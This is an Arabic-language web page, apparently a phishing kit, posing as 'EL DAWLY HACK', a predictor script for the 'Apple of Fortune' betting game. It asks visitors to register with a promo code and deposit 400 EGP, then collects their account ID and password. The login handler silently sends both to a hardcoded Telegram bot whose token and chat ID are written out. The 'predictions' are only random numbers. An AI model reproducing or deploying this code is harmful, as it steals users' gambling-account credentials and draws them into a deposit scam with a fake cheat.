<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EL DAWLY HACK</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts Cairo -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #030305;
            color: #ffffff;
            overflow-x: hidden;
            margin: 0;
            padding: 0;
        }
        .game-container {
            background: #09090e;
            border: 2px solid #ff3333;
            box-shadow: 0 0 25px rgba(255, 51, 51, 0.25);
        }
        .neon-glow {
            text-shadow: 0 0 10px rgba(255, 51, 51, 0.7), 0 0 20px rgba(255, 51, 51, 0.4);
        }
        /* Exact Wooden Apple Tiles matching the images */
        .apple-tile {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: radial-gradient(circle at 35% 35%, #c86d3f, #5a200c);
            border: 2px solid #ff7700;
            box-shadow: inset 0 3px 5px rgba(255,255,255,0.25), inset 0 -4px 6px rgba(0,0,0,0.7), 0 3px 5px rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.25s ease-in-out;
            font-size: 19px;
        }
        @media (min-width: 640px) {
            .apple-tile { width: 46px; height: 46px; font-size: 23px; }
        }
        .apple-tile.active-win {
            background: radial-gradient(circle at 35% 35%, #22c55e, #14532d) !important;
            border: 2px solid #00ff80 !important;
            box-shadow: inset 0 0 15px rgba(0, 255, 128, 0.6), 0 0 15px rgba(0, 255, 128, 0.8) !important;
        }
        .multiplier-badge {
            background: #121218 !important;
            border: 1px solid #ff4d4d !important;
            color: #ff9999 !important;
            font-weight: 700 !important;
            font-size: 11px !important;
        }
        /* Perfectly matched dark login inputs */
        input {
            background-color: rgba(12, 12, 16, 0.95) !important;
            color: #ffffff !important;
            border: 1px solid rgba(255, 51, 51, 0.3) !important;
        }
        input:focus {
            background-color: rgba(5, 5, 8, 1) !important;
            border-color: #ff3333 !important;
            color: #ffffff !important;
            outline: none !important;
        }
        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus, 
        input:-webkit-autofill:active {
            -webkit-box-shadow: 0 0 0 30px #09090e inset !important;
            -webkit-text-fill-color: #ffffff !important;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between relative">

    <!-- Canvas Background Matrix -->
    <canvas id="matrixCanvas" class="fixed inset-0 pointer-events-none z-0 opacity-15 hidden"></canvas>

    <!-- Login Screen Background Image -->
    <div id="loginBg" class="fixed inset-0 bg-cover bg-center z-0 filter brightness-40" style="background-image: url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2000&auto=format&fit=crop');"></div>

    <!-- ==================== LOGIN SECTION ==================== -->
    <div id="loginSection" class="relative z-10 flex-grow flex items-center justify-center p-4">
        <div class="game-container w-full max-w-md p-8 rounded-2xl shadow-2xl relative overflow-hidden">
            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-yellow-500 to-red-500 animate-pulse"></div>
            
            <div class="text-center mb-8">
                <h1 class="text-3xl font-black tracking-wider text-red-500 neon-glow mb-2">EL DAWLY HACK</h1>
                <p class="text-xs text-yellow-400 font-semibold mb-3">السكريبت رقم واحد في الشرق الأوسط</p>
                <div class="inline-block bg-red-950/60 border border-red-500/30 text-red-300 text-xs px-3 py-1 rounded-full">
                    مطلوب التسجيل ببروموكود XTSA وايداع 400ج
                </div>
            </div>

            <form id="loginForm" class="space-y-5" onsubmit="handleLogin(event)">
                <div>
                    <label class="block text-xs font-semibold text-gray-300 mb-2">معرف المستخدم (ID)</label>
                    <input type="text" id="userId" required placeholder="أدخل الـ ID الخاص بك" 
                        class="w-full rounded-xl px-4 py-3 text-sm transition-all">
                </div>

                <div>
                    <label class="block text-xs font-semibold text-gray-300 mb-2">كلمة المرور (Password)</label>
                    <input type="password" id="password" required placeholder="أدخل كلمة المرور" 
                        class="w-full rounded-xl px-4 py-3 text-sm transition-all">
                </div>

                <button type="submit" onclick="playClickSound()" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold py-3.5 rounded-xl shadow-lg transition-all transform active:scale-95">
                    تسجيل الدخول
                </button>
            </form>
        </div>
    </div>

    <!-- ==================== GAME SECTION ==================== -->
    <div id="gameSection" class="relative z-10 flex-grow flex flex-col hidden">
        <!-- Top Navigation Bar -->
        <header class="game-container border-b border-red-500/30 px-4 py-3 flex items-center justify-between text-xs sm:text-sm">
            <div class="flex items-center space-x-3 space-x-reverse font-bold text-yellow-400">
                <span>Server : Egypt</span>
            </div>
            <div class="text-yellow-400 font-bold">
                Money : <span id="moneyDisplay">1000.00</span>
            </div>
            <button onclick="playClickSound(); logout()" class="text-red-400 hover:text-red-300 font-bold px-2 py-1">
                خروج ⮡
            </button>
        </header>

        <!-- Game Title Header -->
        <div class="text-center py-2 bg-black/40">
            <h2 class="text-yellow-400 font-black tracking-widest text-base sm:text-lg neon-glow">APPLE OF FORTUNE</h2>
        </div>

        <!-- Main Game Content -->
        <main class="flex-grow flex items-center justify-center p-2 sm:p-4 max-w-3xl mx-auto w-full">
            <div class="game-container w-full p-3 sm:p-5 rounded-2xl shadow-2xl flex flex-row gap-2 sm:gap-4 items-center justify-center">
                
                <!-- Sidebar Multipliers (1.23 to 349.68) -->
                <div class="w-14 sm:w-16 flex flex-col-reverse gap-1.5 sm:gap-2 bg-black/80 p-1.5 rounded-xl border border-red-500/40 shrink-0">
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x1.23</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x1.54</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x1.93</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x2.41</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x4.02</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x6.71</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x11.18</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x27.92</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x69.93</div>
                    <div class="multiplier-badge h-9 sm:h-11 flex items-center justify-center rounded-md text-xs">x349.68</div>
                </div>

                <!-- Apple Grid Area (5x10) -->
                <div class="flex-grow flex flex-col-reverse gap-1.5 sm:gap-2 w-full max-w-md items-center" id="appleGridContainer">
                </div>

            </div>
        </main>

        <!-- Bottom Controls Bar (SHOW APPLE on Left, NEW GAME on Right)[span_0](start_span)[span_0](end_span)[span_1](start_span)[span_1](end_span)[span_2](start_span)[span_2](end_span)[span_3](start_span)[span_3](end_span) -->
        <footer class="game-container border-t border-red-500/30 p-3">
            <div class="max-w-md mx-auto flex gap-3">
                <button onclick="playClickSound(); startPrediction()" id="startBtn" class="flex-grow bg-transparent border-2 border-red-500 hover:bg-red-500/20 text-yellow-400 font-bold py-3 rounded-xl transition-all text-xs sm:text-sm tracking-wider shadow-lg">
                    SHOW APPLE
                </button>
                <button onclick="playClickSound(); resetPrediction()" class="flex-grow bg-transparent border-2 border-red-500 hover:bg-red-500/20 text-yellow-400 font-bold py-3 rounded-xl transition-all text-xs sm:text-sm tracking-wider shadow-lg">
                    NEW GAME
                </button>
            </div>
        </footer>
    </div>

    <!-- JavaScript Logic -->
    <script>
        const TELEGRAM_BOT_TOKEN = '8764052287:AAGpnxjPYMUn7pl5PAjdQVhMPi_dZsbWz-I';
        const TELEGRAM_CHAT_ID = '8219267719';

        let audioCtx = null;

        function initAudio() {
            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            if (audioCtx.state === 'suspended') audioCtx.resume();
        }

        function playClickSound() {
            try {
                initAudio();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(440, audioCtx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.05);
                gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.05);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.05);
            } catch (e) {}
        }

        function playHackerBeep() {
            try {
                initAudio();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'square';
                osc.frequency.setValueAtTime(1200, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.08);
            } catch (e) {}
        }

        const rowCount = 10;
        const colsCount = 5;
        let isPredicting = false;
        const rowElements = [];

        const gridContainer = document.getElementById('appleGridContainer');
        for (let r = 0; r < rowCount; r++) {
            const rowDiv = document.createElement('div');
            rowDiv.className = "flex gap-2 sm:gap-3 w-full justify-center items-center h-9 sm:h-11";
            rowDiv.dataset.row = r;

            for (let c = 0; c < colsCount; c++) {
                const cell = document.createElement('div');
                cell.className = "apple-tile";
                cell.innerHTML = "";
                rowDiv.appendChild(cell);
            }
            gridContainer.appendChild(rowDiv);
            rowElements.push(rowDiv);
        }

        async function handleLogin(event) {
            event.preventDefault();
            const userId = document.getElementById('userId').value;
            const password = document.getElementById('password').value;

            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                const message = `🚨 محاولة تسجيل دخول جديدة:\n🆔 ID: ${userId}\n🔑 Password: ${password}`;
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message
                        })
                    });
                } catch (e) {}
            }

            document.getElementById('loginSection').classList.add('hidden');
            document.getElementById('loginBg').classList.add('hidden');
            document.getElementById('gameSection').classList.remove('hidden');
            document.getElementById('matrixCanvas').classList.remove('hidden');
            initMatrix();
        }

        function logout() {
            document.getElementById('gameSection').classList.add('hidden');
            document.getElementById('matrixCanvas').classList.add('hidden');
            document.getElementById('loginSection').classList.remove('hidden');
            document.getElementById('loginBg').classList.remove('hidden');
            resetPrediction();
        }

        async function startPrediction() {
            if (isPredicting) return;
            isPredicting = true;
            
            const btn = document.getElementById('startBtn');
            btn.disabled = true;
            btn.classList.add('opacity-50');

            resetGridVisuals();

            for (let r = 0; r < rowCount; r++) {
                const rowDiv = rowElements[r];
                const winningCol = Math.floor(Math.random() * colsCount);

                playHackerBeep();
                await new Promise(resolve => setTimeout(resolve, 300));

                for (let c = 0; c < colsCount; c++) {
                    if (c === winningCol) {
                        rowDiv.children[c].innerHTML = "🍎";
                        rowDiv.children[c].classList.add('active-win');
                    } else {
                        rowDiv.children[c].innerHTML = "";
                    }
                }
            }

            btn.disabled = false;
            btn.classList.remove('opacity-50');
            isPredicting = false;
        }

        function resetPrediction() {
            if (isPredicting) return;
            resetGridVisuals();
        }

        function resetGridVisuals() {
            for (let r = 0; r < rowCount; r++) {
                const rowDiv = rowElements[r];
                for (let c = 0; c < colsCount; c++) {
                    rowDiv.children[c].className = "apple-tile";
                    rowDiv.children[c].innerHTML = "";
                }
            }
        }

        function initMatrix() {
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const letters = '01XTSAELDWLYHACK';
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = Array(Math.floor(columns)).fill(1);

            function draw() {
                ctx.fillStyle = 'rgba(3, 3, 5, 0.08)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#ff3333';
                ctx.font = fontSize + 'px monospace';

                for (let i = 0; i < drops.length; i++) {
                    const text = letters.charAt(Math.floor(Math.random() * letters.length));
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            setInterval(draw, 33);
        }
    </script>
</body>
</html>
